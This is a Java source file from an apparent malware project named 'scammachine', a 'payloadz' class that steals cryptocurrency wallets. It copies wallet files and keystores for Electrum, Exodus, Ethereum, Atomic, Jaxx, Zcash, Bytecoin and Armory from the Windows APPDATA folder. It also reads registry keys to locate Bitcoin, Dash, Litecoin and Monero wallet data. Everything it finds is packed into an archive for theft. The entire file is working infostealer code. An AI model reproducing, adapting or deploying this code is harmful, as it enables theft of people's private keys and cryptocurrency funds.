package me.teejayx6.scammachine.payloadz;

import me.teejayx6.scammachine.util.ArchiveUtil;
import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;
import me.teejayx6.scammachine.util.WindowsRegistry;

import java.io.File;

public class Crypto
{
    public static int wallets = 0;
    public static String walletnames = "";

    public static void execute()
    {
        String appdata = System.getenv("APPDATA");
        if (!appdata.endsWith("\\"))
            appdata += "\\";

        stealFiles(appdata + "Armory\\", "Crypto/Armory");
        stealFiles(appdata + "atomic\\Local Storage\\leveldb\\", "Crypto/AtomicWallet");
        stealFiles(appdata + "Electrum\\wallets\\", "Crypto/Electrum");
        stealFiles(appdata + "Ethereum\\keystore\\", "Crypto/Ethereum");
        stealFiles(appdata + "Exodus\\exodus.wallet\\", "Crypto/Exodus");
        stealFiles(appdata + "com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\", "Crypto/Jaxx");
        stealFiles(appdata + "Zcash\\", "Crypto/Zcash");

        stealFile(appdata + "bytecoin\\", ".wallet", "Crypto/Bytecoin");

        stealRegistry("HKCU\\Software\\Bitcoin\\Bitcoin-Qt", "strDataDir", "\\wallet.dat", "Crypto/BitcoinCore");
        stealRegistry("HKCU\\Software\\Dash\\Dash-Qt", "strDataDir", "\\wallet.dat", "Crypto/DashCore");
        stealRegistry("HKCU\\Software\\Litecoin\\Litecoin-Qt", "strDataDir", "\\wallet.dat", "Crypto/LitecoinCore");

        // я не ебу это норм работает или хуево ибо я не пизжу папки
        stealRegistryFolder("HKCU\\Software\\monero-project\\monero-core", "wallet_path", "Crypto/MoneroCore");
    }

    public static void stealFiles(String path, String archivename)
    {
        File file = new File(path);
        if (file != null)
        {
            File[] files = file.listFiles();
            if (files != null)
            {
                wallets++;
                walletnames += archivename.substring(archivename.indexOf("/") + 1) + "\n";
                for (File f : files)
                {
                    if (!f.isDirectory())
                    {
                        try
                        {
                            TempFile tmp = FileUtils.readFile(f.getAbsolutePath());
                            if (tmp != null)
                            {
                                ArchiveUtil.addFile(archivename + "/" + f.getName(), tmp.bytes);
                                FileUtils.close(tmp);
                            }
                        }
                        catch (Exception e)
                        {

                        }
                    }
                }
            }
        }
    }

    public static void stealFile(String folder, String filename, String archivename)
    {
        File file = new File(folder);
        if (file != null)
        {
            File[] files = file.listFiles();
            if (files != null)
            {
                wallets++;
                walletnames += archivename.substring(archivename.indexOf("/") + 1) + "\n";
                for (File f : files)
                {
                    if (!f.isDirectory())
                    {
                        if (f.getName().contains(filename))
                        {
                            try
                            {
                                TempFile tmp = FileUtils.readFile(f.getAbsolutePath());
                                if (tmp != null)
                                {
                                    ArchiveUtil.addFile(archivename + "/" + f.getName(), tmp.bytes);
                                    FileUtils.close(tmp);
                                }
                            }
                            catch (Exception e)
                            {

                            }
                        }
                    }
                }
            }
        }
    }

    public static void stealRegistry(String regpath, String regvalue, String filepath, String archivename)
    {
        String reg = WindowsRegistry.readRegistry(regpath, regvalue);
        if (reg != null)
        {
            try
            {
                TempFile tmp = FileUtils.readFile(reg + filepath);
                if (tmp != null)
                {
                    walletnames += archivename.substring(archivename.indexOf("/") + 1) + "\n";
                    ArchiveUtil.addFile(archivename, tmp.bytes);
                    FileUtils.close(tmp);
                }
            }
            catch (Exception e)
            {

            }
        }
    }

    public static void stealRegistryFolder(String regpath, String regvalue, String archivename)
    {
        String reg = WindowsRegistry.readRegistry(regpath, regvalue);
        if (reg != null)
        {
            File folder = new File(reg);
            if (folder.exists() && folder.isDirectory())
            {
                File[] files = folder.listFiles();
                if (files != null)
                {
                    wallets++;
                    walletnames += archivename.substring(archivename.indexOf("/") + 1) + "\n";
                    for (File file : files)
                    {
                        if (!file.isDirectory())
                        {
                            try
                            {
                                TempFile tmp = FileUtils.readFile(file.getAbsolutePath());
                                if (tmp != null)
                                {
                                    ArchiveUtil.addFile(archivename + "/" + file.getName(), tmp.bytes);
                                    FileUtils.close(tmp);
                                }
                            }
                            catch (Exception e)
                            {

                            }
                        }
                    }
                }
            }
        }
    }
}
